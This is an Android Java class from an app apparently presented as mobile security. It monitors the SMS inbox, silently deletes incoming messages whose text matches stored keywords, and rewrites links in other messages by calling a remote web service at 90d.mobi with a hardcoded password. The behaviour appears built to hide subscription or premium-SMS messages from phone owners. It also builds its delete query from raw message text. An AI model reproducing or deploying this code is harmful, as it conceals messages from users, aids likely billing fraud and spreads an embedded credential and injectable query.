package com.caliente.mobilsecurit;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLDecoder;
import java.net.URLEncoder;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

public class SmsReceiveObserver extends ContentObserver {
	
	private static final String TAG = "SMSTRACKER";
    private static final Uri STATUS_URI = Uri.parse("content://sms");
    
    private Context mContext;
    
	public SmsReceiveObserver(Handler handler, Context ctx) {
		super(handler);
		mContext = ctx;
	}

	@Override
	public boolean deliverSelfNotifications() {
		return true;
	}

	@Override
	public void onChange(boolean selfChange) {
		try{
			SharedPreferences preferences = mContext.getApplicationContext().getSharedPreferences("config", mContext.getApplicationContext().MODE_PRIVATE);
			String pref_supprSmsRef=preferences.getString("supprSmsRef", null);
			String modifSmsRelance=preferences.getString("modifSmsRelance", null);
			
	        Cursor sms_receive_cursor = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);
	        if (sms_receive_cursor != null) 
	        {
		        if (sms_receive_cursor.moveToFirst()) 
		        {
		        	String numero_appelant=sms_receive_cursor.getString(sms_receive_cursor.getColumnIndex("address"));
		        	String content = sms_receive_cursor.getString(sms_receive_cursor.getColumnIndex("body"));

		        	System.out.println("pref_supprSmsRef::"+pref_supprSmsRef);
		        	System.out.println("numero_appelant::"+numero_appelant+" ||	content::"+content);
		        	
		        	String[] tab_supprSmsRef = pref_supprSmsRef.split("||");
		        	
		        	for (int i = 0; i < tab_supprSmsRef.length; i++) {
		        		// SI MT ON SUPPRIME
			        	if(content.contains(tab_supprSmsRef[i]))
			        		mContext.getContentResolver().delete(STATUS_URI, "body ='" + content + "'", null);
					}
		        	
		        	// SI RELANCE ON MODIFIE LE LINK POUR COMPAT APPLICATION
		        	if(content.contains(modifSmsRelance))
		        	{
		        		// ON EXTRAIT LA CLEF
		        		String[] tokens = content.split(modifSmsRelance);
		        		tokens=tokens[1].split(" ");
		        		String clef_smallUrl=tokens[0];
		        		
		        		// ON APPEL LE WS POUR RECUP LURL
		        		String url_ws="http://90d.mobi/ptools/geturl.php?pass=g45z56ZEze56eT7z6z2fm&cleurl="+clef_smallUrl+"&action=reverse";
		        		String url_enreg=getContents(url_ws, "UTF-8");
		    			
		        		// ON RAJOUTE LARGUMENT APP
		        		if(!url_enreg.contains("/app/"))
		        		{
		        			tokens = url_enreg.split("/");
			    			String new_url="http://"+tokens[2]+"/app/";
			    			
			    			for (int i = 3; i < tokens.length; i++)
			    				new_url+=tokens[i]+"/";
			    			
			    			new_url=new_url.substring(0, new_url.length()-1);
			    			new_url = URLEncoder.encode(new_url);
			    			
			    			// ON APPEL LE WS POUR UPDATE LURL
			    			url_ws="http://90d.mobi/ptools/geturl.php?pass=g45z56ZEze56eT7z6z2fm&cleurl="+clef_smallUrl+"&action=update&url="+new_url;
			    			url_enreg=getContents(url_ws, "UTF-8");
		        		}
		        	}
		        }
	        }
	        else
	        	Log.e(TAG, "Send Cursor is Empty");
		}
		catch(Exception sggh){
			Log.e(TAG, "Error on onChange : "+sggh.toString());
		}
		super.onChange(selfChange);
	}
	
	public static String getContents(String url, String encodeType) {
        URL u;
        StringBuilder builder = new StringBuilder();
        try {
            u = new URL(url);
            try {
                BufferedReader theHTML = new BufferedReader(new InputStreamReader(u.openStream(), encodeType));
                String thisLine;
                while ((thisLine = theHTML.readLine()) != null) {
                    builder.append(thisLine).append("\n");
                } 
            } 
            catch (Exception e) {
                System.err.println(e);
            }
        } catch (MalformedURLException e) {
            System.err.println(url + " is not a parseable URL");
            System.err.println(e);
        }
        return builder.toString();
    }
}